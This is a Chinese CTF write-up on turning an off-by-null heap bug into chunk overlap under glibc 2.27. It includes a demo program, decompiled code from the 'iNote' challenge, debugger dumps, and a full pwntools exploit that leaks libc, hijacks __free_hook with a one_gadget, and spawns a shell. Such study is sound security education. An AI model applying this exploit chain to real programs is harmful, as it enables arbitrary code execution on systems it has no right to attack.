# 堆进阶之仅含off by null的利用



## 特征标志

* 仅存在 off by null 漏洞

* 不能申请大于 fastbin 的堆块（可以申请也能用这种方法）

  如果能申请大于 fastbin 的堆块，申请 0x101 覆盖成 0x100 并控制 prev_size ，就能向低地址的堆块合并

* 存在 scanf （或其他将 fastbin 放置到 unsortedbin 的途径）

  单纯 offbynull 无法在 fastbin 中利用，需要结合 unsortedbin

## 适用glibc版本

无论有无 tcache ，都能适用。

存在 tcache 则需要先将对应 size 填满，才能放入 fastbin 。

## 攻击效果

造成堆重叠（chunk extend），进而控制各类 bin 中的指针，完成 getshell

## 原理

难点在于：fastbin 堆块的 size 长度为 1 个字节（如：0xf0），如果 offbynull 覆盖 prev_inuse 时，会将整个 size 覆盖为 0x00 ，而这会引起报错。

解决思路：

1. 利用 unsortedbin 形成时，会将其所在的前一个（高地址）非 topchunk 的堆块 prev_size 设置为 0
2. 利用 offbynull 修改在 unsortedbin 中的空闲堆块 size ，造成空洞。将 unsortedbin  重新分配出来时，前一个堆块 prev_size=0 的状态被保留
3. 在原来 unsortedbin 的连续空间中，在低地址处构造出 unsortedbin ，释放前一个堆块时会先后合并，重叠部分堆空间

## Demo程序

> 程序有问题，等待完善
>
> Scanf 申请的缓存区问题

```c
#include <stdio.h>
#include <stdlib.h>

char *ptr[16];

void init(){
    setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}

int main(int argc,char *argv[]){
    // init();
    char* protect;
    char buf[0x1000];

    ptr[0]=malloc(0x18);//用于offbynull
    ptr[1]=malloc(0x68);
    ptr[2]=malloc(0x68);
    ptr[3]=malloc(0x28);
    ptr[4]=malloc(0x68);//用于先后合并形成堆重叠
    protect=malloc(0x100);//防止与topchunk合并

    free(ptr[1]);
    free(ptr[2]);
    free(ptr[3]);

    /* chunk3内伪造header绕过检查 */
    *((long int*)ptr[3]+2) = 0x100;//offbynull修改后的size
    *((long int*)ptr[3]+3) = 0x10;

    /* chunk4的prev_inuse成功被设定为0 */
    scanf("%s",buf);//fastbin 2 unsortedbin

    /* off bu null，空闲堆块大小从0x110变成0x100 */
    *(ptr[0]+0x18)=0x00;

    /* 切割0x100，切割完成之后unsortedbin原来堆块没有了 */
    ptr[1]=malloc(0x68);
    ptr[2]=malloc(0x68);
    ptr[3]=malloc(0x18);

    /* 布置一个unsortedbin用于向后unlink */
    free(ptr[1]);
    free(ptr[2]);
    scanf("%s",buf);//fastbin 2 unsortedbin

    /* 向后unlink，形成堆重叠 */
    free(ptr[4]);
    scanf("%s",buf);//fastbin 2 unsortedbin

    return 0;
}
```

## 详细过程

1. 如图布置出相邻的堆块：

   * chunk0 用于 offbynull ；chunk123 用于修改 chunk4 prev_inuse ；chunk4 用于向后 unlink 形成堆重叠
   * 伪造 chunk header ：prev_size 为 offbynull 之后的 size

   ![Untitled Diagram1](https://gitee.com/mrskye/Picbed/raw/master/img/20210623182853.png)

   

2. 将 chunk123 释放后进入 fastbin ，然后利用 scanf 将 fastbin 的空闲堆块整理进入 unsortedbin 

   ![Untitled Diagram (1)](https://gitee.com/mrskye/Picbed/raw/master/img/20210623182437.png)

3. offbynull 修改在 unsortedbin 的堆 size 

   ![Untitled Diagram (5)](https://gitee.com/mrskye/Picbed/raw/master/img/20210623193719.png)

4. 然后将空闲堆块切分多次取出（因为不能申请大于 fastbin）。当申请 0x20 时，修改的是 fake header 的 prev_inuse 标志位，chunk4 prev_inuse 被保留下来

   ![Untitled Diagram (3)](https://gitee.com/mrskye/Picbed/raw/master/img/20210623193120.png)

5. 将  chunk12 重新放回 unsortedbin 后，释放 chunk4 造成向后 unlink ，形成堆重叠

   ![Untitled Diagram2](https://gitee.com/mrskye/Picbed/raw/master/img/20210623194725.png)

   ![Untitled Diagram6](https://gitee.com/mrskye/Picbed/raw/master/img/20210623195112.png)

6. 造成重叠后就是常规思路利用

## 相关例题

* [2021国赛华南赛区-iNote]
* （libc-2.27.so）

## 例题详解

#### checksec

保护全开，正常堆题的保护模式基本都是全开

```C
q@ubuntu:~/Desktop$ checksec iNote
[*] '/home/q/Desktop/iNote'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

```

#### main函数

main函数如下是非常常规的菜单类题目，漏洞点存在于edit函数中，因篇幅关系，下面只放上edit函数代码

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v3[5]; // [rsp+0h] [rbp-28h] BYREF

  v3[1] = __readfsqword(0x28u);
  my_init();
  while ( 1 )
  {
    puts("1. allocate");
    puts("2. edit");
    puts("3. show");
    puts("4. delete");
    puts("5. exit");
    __printf_chk(1LL, "Your choice: ");
    __isoc99_scanf(&aLd, v3);
    switch ( v3[0] )
    {
      case 1LL:
        add();
        break;
      case 2LL:
        edit();                                 // off by null
        break;
      case 3LL:
        show();
        break;
      case 4LL:
        delete();
        break;
      case 5LL:
        exit(0);
      default:
        puts("Unknown");
        break;
    }
  }
}
```

#### edit函数

##### 漏洞代码

在如下部分代码中，当我们对chunk进行编辑完成的时候输入'\n'，程序会将其替换为'"\x00"，从而造成了off by null漏洞的生成

```C
do
      {
        read(0, v4, 1uLL);
        if ( *v4 == '\n' )
        {
          *v4 = 0;
          goto LABEL_8;
        }
```



```C
unsigned __int64 edit()
{
  unsigned __int64 v0; // rbx
  __int64 ptr; // r12
  __int64 size; // rbp
  _BYTE *v3; // rbp
  _BYTE *v4; // rbx
  _BYTE *v5; // rax
  __int64 v6; // rax
  unsigned __int64 v8; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v9; // [rsp+8h] [rbp-20h]

  v9 = __readfsqword(0x28u);
  __printf_chk(1LL, "Index: ");
  __isoc99_scanf(&aLd, &v8);
  v0 = v8;
  if ( v8 <= 0xF && ptr_list[v8] )
  {
    __printf_chk(1LL, "Content: ");
    ptr = ptr_list[v0];
    size = size_list[v0];
    if ( size )                                 // off by null
    {
      v3 = (_BYTE *)(ptr + size);
      v4 = (_BYTE *)ptr_list[v0];
      do
      {
        read(0, v4, 1uLL);
        if ( *v4 == '\n' )
        {
          *v4 = 0;
          goto LABEL_8;
        }
        v5 = v4++;
        v6 = (__int64)&v5[-ptr + 1];
      }
      while ( v4 != v3 );
      v4 = (_BYTE *)(ptr + v6);
    }
    else
    {
      v4 = (_BYTE *)ptr_list[v0];
    }
LABEL_8:
    *v4 = 0;
  }
  return __readfsqword(0x28u) ^ v9;
}
```

### 思路概述

该题目libc版本为2.27，且仅有off bu null这一个漏洞。



第一步，填充完毕tcache，将构建好的chunk放置于fastbin，再利用scanf输入长字符串触发malloc_consolidate ，将fastbin整理到unsortedbin中，进行libc_base的泄露。



第二步，利用off by null漏洞修改chunk size 的prev_inuse=0，

结合伪造 header 、offbynull 向后unlink制造堆重叠。



第三步，常规攻击打'__free_hook'，传入onegadget去getshell。



#### 第一步实操

##### 1.1

```Python
#unsortedbin泄露libc地址
for i in range(8):
    add(i,0x78)

add(8,0x58)#后面offbynull构造0x110
add(9,0x20)#后面offbynull构造0x110
for i in list(range(8)):#tcache填充
    delete(i)
p.sendlineafter("choice: ",'1'*0x7000)#fastbin 2 unsortedbin 触发malloc_consolidate 
for i in list(range(7))[::-1]:
    add(i,0x78)
add(7,0x78)
show(7)
#gdb.attach(p)
p.recvuntil("Content: ")
main_arean_208 = u64(p.recv(6).ljust(8,'\x00'))
log.info("main_arean_208:"+hex(main_arean_208))
libc_base = main_arean_208 - 208 - (0x7ffff7dcdc40-0x7ffff79e2000)
log.info("libc_base:"+hex(libc_base))

```

7号chunk中的内容

```C
pwndbg> x/32gx 0x558c496305d0
0x558c496305d0:	0x0000000000000000	0x0000000000000081
0x558c496305e0:	0x00007f2cb69bcd10	0x00007f2cb69bcd10
0x558c496305f0:	0x0000000000000000	0x0000000000000000

```



#### 第二步实操

##### 2.1

构造一个0x110的(0x70+0x60+0x30)unsortedbin，同时伪造一个header，用来向前合并造成堆重叠，并利用off by null 修改

0x110的chunk size为0x100

```Python
for i in list(range(7)):
    delete(i)
delete(7)#0x68

for i in range(7):
    add(i,0x58)
for i in list(range(7)):
    delete(i)
delete(8)#0x58

for i in list(range(7)):
    add(i,0x20)
for i in list(range(7)):
    delete(i)
edit(9,"QAQ.QVQ."*2+p64(0x100)+p64(0x10))#伪造一个header，用来向前（低地址）合并造成堆重叠
gdb.attach(p)
delete(9)#0x20
#gdb.attach(p)
p.sendlineafter("choice: ",'1'*0x7000)#fastbin 2 unsortedbin
#gdb.attach(p)
#off by null将0x110覆盖为0x100
add(11,0x78)#head:用于off by null溢出修改size(0x110->0x100)
#gdb.attach(p)
edit(11,'a'*0x78)
```

9号chunk填充完毕的状态如下

```C
pwndbg> x/32gx 0x556e6dcc56b0
0x556e6dcc56b0:	0x0000000000000000	0x0000000000000031
0x556e6dcc56c0:	0x2e5156512e514151	0x2e5156512e514151
0x556e6dcc56d0:	0x0000000000000100	0x0000000000000010
```

再次触发malloc_consolidate 和off by null后chunk的排布如下

```C
0x56299f4065d0      0x6161616161616161  0x100                Freed     0x7f01a7875da0    0x7f01a7875da0
0x56299f4066d0      0x100               0x10                 Freed              0x110              0x60
```

如上主要部分，我们已经成功获得chunk size为0x100的chunk，同时prev_size=0x110;prev_inuse=0任然保持

```C
pwndbg> parseheap
addr                prev                size                 status              fd                bk                
0x56299f406000      0x0                 0x250                Used                None              None
0x56299f406250      0x0                 0x80                 Freed                0x0              None
0x56299f4062d0      0x0                 0x80                 Freed     0x56299f406260              None
0x56299f406350      0x0                 0x80                 Freed     0x56299f4062e0              None
0x56299f4063d0      0x0                 0x80                 Freed     0x56299f406360              None
0x56299f406450      0x0                 0x80                 Freed     0x56299f4063e0              None
0x56299f4064d0      0x0                 0x80                 Freed     0x56299f406460              None
0x56299f406550      0x0                 0x80                 Freed 0x61616161616161610x6161616161616161
0x56299f4065d0      0x6161616161616161  0x100                Freed     0x7f01a7875da0    0x7f01a7875da0
0x56299f4066d0      0x100               0x10                 Freed              0x110              0x60
0x56299f4066e0      0x110               0x60                 Freed                0x0              None
0x56299f406740      0x3131313131313131  0x60                 Freed     0x56299f4066f0              None
0x56299f4067a0      0x3131313131313131  0x60                 Freed     0x56299f406750              None
0x56299f406800      0x3131313131313131  0x60                 Freed     0x56299f4067b0              None
0x56299f406860      0x3131313131313131  0x60                 Freed     0x56299f406810              None
0x56299f4068c0      0x3131313131313131  0x60                 Freed     0x56299f406870              None
0x56299f406920      0x3131313131313131  0x60                 Freed     0x56299f4068d0              None
0x56299f406980      0x3131313131313131  0x30                 Freed                0x0              None
0x56299f4069b0      0x3131313131313131  0x30                 Freed     0x56299f406990              None
0x56299f4069e0      0x3131313131313131  0x30                 Freed     0x56299f4069c0              None
0x56299f406a10      0x3131313131313131  0x30                 Freed     0x56299f4069f0              None
0x56299f406a40      0x3131313131313131  0x30                 Freed     0x56299f406a20              None
0x56299f406a70      0x3131313131313131  0x30                 Freed     0x56299f406a50              None
0x56299f406aa0      0x3131313131313131  0x30                 Freed     0x56299f406a80              None

```

##### 2.2

在如下部分chunk(0x110)后面布置一个chunk用来实现unlink造成堆重叠。

```c
0x56299f4066d0      0x100               0x10                 Freed              0x110              0x60
```

接着将0x100的chunk从unsortedbin之中分割出来一部分(0x78+0x58+0x10)

【在上面的0x56299f4066d0这部分chunk中我们在步骤2.1中已经完成他的chunk size修改成了0x10所以分割unsortedbin时候可以正常分割0x10大小的chunk。】

unsortedbin 中还剩余 0x20 空间，与下一个 chunk 相差了 0x10 ，我们提前在这 0x10 中伪造 header ，当分配后修改的是 fake header prev_inuse 下一个 chunk 的 prev_inuse 被正常保留，可以用于 unlink 制造重叠空间

```Python
#0x110后面布置一个堆块，用于unlink造成堆重叠
for i in range(6):
    add(i,0x58)
add(12,0x58)#tail:unlink

for i in range(6):#清空堆指针列表，方便后续操作
    delete(i)

#将0x100切分分配出来0x78+0x58+0x10
for i in range(6):
    add(i,0x78)
add(8,0x78)
for i in range(6):
    delete(i)
for i in range(6):
    add(i,0x58)
add(9,0x58)
for i in range(6):
    delete(i)
add(10,0x10)
#gdb.attach(p)
```

2.2步骤完成后的chunk内容如下

```C
pwndbg> x/10gx 0x55d6f7eeb6b0
0x55d6f7eeb6b0:	0x0000000000000000	0x0000000000000021
0x55d6f7eeb6c0:	0x0000000000000000	0x0000000000000000
0x55d6f7eeb6d0:	0x0000000000000020	0x0000000000000011
0x55d6f7eeb6e0:	0x0000000000000110	0x0000000000000060
0x55d6f7eeb6f0:	0x0000000000000000	0x0000000000000000
```

在这部分chunk中prev_inuse以及prev_size都被保留了下来

```c
0x55d6f7eeb6e0:	0x0000000000000110	0x0000000000000060
```

##### 2.3

然后将 0x78+0x58 放回到 unsortedbin ，释放 0x110 后面的堆块就会向前合并，即 unsortedbin 里面变成 0x110 + 0x110 后面的堆 size 。

```Python
for i in range(7):
    add(i,0x78)
for i in range(7):
    delete(i)
delete(8)#fastbin
for i in range(7):
    add(i,0x58)
for i in range(7):
    delete(i)
delete(9)#fastbin

p.sendlineafter("choice: ",'1'*0x7000)
gdb.attach(p)
```

合并完成后的chunk如下，我们可以清楚的看见chunk size成功合并为0xe0大小同时prev_inuse 也变成了1

```c
pwndbg> x/8gx 0x55b336b405d0 
0x55b336b405d0:	0x6161616161616161	0x00000000000000e1
0x55b336b405e0:	0x00007f3aeb0d1d70	0x00007f3aeb0d1d70
0x55b336b405f0:	0x0000000000000000	0x0000000000000000
0x55b336b40600:	0x0000000000000000	0x0000000000000000
```

接着进行堆重叠

```Python
delete(12)
p.sendlineafter("choice: ",'1'*0x7000)
```

重叠部分的chunk如下

```c
pwndbg> x/32gx 0x55b67f11d6b0
0x55b67f11d6b0:	0x00000000000000e0	0x0000000000000020
0x55b67f11d6c0:	0x0000000000000000	0x0000000000000000
```



#### 第三步实操

##### 3.1

直接利用重叠部分chunk攻打free_hook

```Python
for i in range(7):
    add(i,0x78)
add(8,0x78)
for i in range(7):
    delete(i)
for i in range(7):
    add(i,0x58)
add(9,0x58)
for i in range(7):
    delete(i)
for i in range(7):
    add(i,0x20)
add(12,0x20)#hacker

for i in range(7):
    delete(i)

for i in range(7):
    add(i,0x20)

delete(10)

edit(12,p64(libc_base+libc.sym['__free_hook'])+'\n')

add(14,0x20)

add(15,0x20)

edit(15,p64(libc_base+0x4f432)+'\n')

delete(0)

p.interactive()
```



## EXP

```Python
#encoding:utf-8
from pwn import *
context.log_level='debug'

p = process("./iNote")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(id,size):
    p.sendlineafter("choice: ",str(1))
    p.sendlineafter("Index: ",str(id))
    p.sendlineafter("Size: ",str(size))
def edit(id,content):
    p.sendlineafter("choice: ",str(2))
    p.sendlineafter("Index: ",str(id))
    p.sendafter("Content: ",content)
def show(id):
    p.sendlineafter("choice: ",str(3))
    p.sendlineafter("Index: ",str(id))
def delete(id):
    p.sendlineafter("choice: ",str(4))
    p.sendlineafter("Index: ",str(id))

#unsortedbin泄露libc地址
for i in range(8):
    add(i,0x78)

add(8,0x58)#后面offbynull构造0x110
add(9,0x20)#后面offbynull构造0x110

for i in list(range(8)):
    delete(i)

p.sendlineafter("choice: ",'1'*0x7000)#fastbin 2 unsortedbin

for i in list(range(7))[::-1]:
    add(i,0x78)

add(7,0x78)
show(7)

p.recvuntil("Content: ")
main_arean_208 = u64(p.recv(6).ljust(8,'\x00'))
log.info("main_arean_208:"+hex(main_arean_208))
libc_base = main_arean_208 - 208 - (0x7ffff7dcdc40-0x7ffff79e2000)
log.info("libc_base:"+hex(libc_base))

# off by null 构造重叠区域

# 构造0x110(0x70+0x60+0x30)的unsortedbin
# unlink时会将0x110后面堆修改为：prev_size=0x110;prev_inuse=0;
for i in list(range(7)):
    delete(i)
delete(7)#0x68

for i in range(7):
    add(i,0x58)
for i in list(range(7)):
    delete(i)
delete(8)#0x58

for i in list(range(7)):
    add(i,0x20)
for i in list(range(7)):
    delete(i)
edit(9,"QAQ.QVQ."*2+p64(0x100)+p64(0x10))#伪造一个header，用来向前（低地址）合并造成堆重叠

delete(9)#0x20

p.sendlineafter("choice: ",'1'*0x7000)#fastbin 2 unsortedbin

#off by null将0x110覆盖为0x100
add(11,0x78)#head:用于off by null溢出修改size(0x110->0x100)
edit(11,'a'*0x78)


#0x110后面布置一个堆块，用于unlink造成堆重叠
for i in range(6):
    add(i,0x58)
add(12,0x58)#tail:unlink

for i in range(6):#清空堆指针列表，方便后续操作
    delete(i)

#将0x100切分分配出来0x78+0x58+0x10
for i in range(6):
    add(i,0x78)
add(8,0x78)
for i in range(6):
    delete(i)
for i in range(6):
    add(i,0x58)
add(9,0x58)
for i in range(6):
    delete(i)
add(10,0x10)

#然后将 0x78+0x58 放回到 unsortedbin ，释放 0x110 后面的堆块就会向前合并，即 unsortedbin 里面变成 0x110 + 0x110 后面的堆 size 。
for i in range(7):
    add(i,0x78)
for i in range(7):
    delete(i)
delete(8)#fastbin
for i in range(7):
    add(i,0x58)
for i in range(7):
    delete(i)
delete(9)#fastbin

p.sendlineafter("choice: ",'1'*0x7000)

# 堆重叠
delete(12)

p.sendlineafter("choice: ",'1'*0x7000)

#free_hook attack
for i in range(7):
    add(i,0x78)
add(8,0x78)
for i in range(7):
    delete(i)
for i in range(7):
    add(i,0x58)
add(9,0x58)
for i in range(7):
    delete(i)
for i in range(7):
    add(i,0x20)
add(12,0x20)#hacker

for i in range(7):
    delete(i)

for i in range(7):
    add(i,0x20)

delete(10)

edit(12,p64(libc_base+libc.sym['__free_hook'])+'\n')

add(14,0x20)

add(15,0x20)

edit(15,p64(libc_base+0x4f432)+'\n')

delete(0)

p.interactive()
```

getshell成功

```shell
[*] Switching to interactive mode
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x1a bytes:
    'flag{QAQ_I_am_local_flag}\n'
flag{QAQ_I_am_local_flag}
$  
```

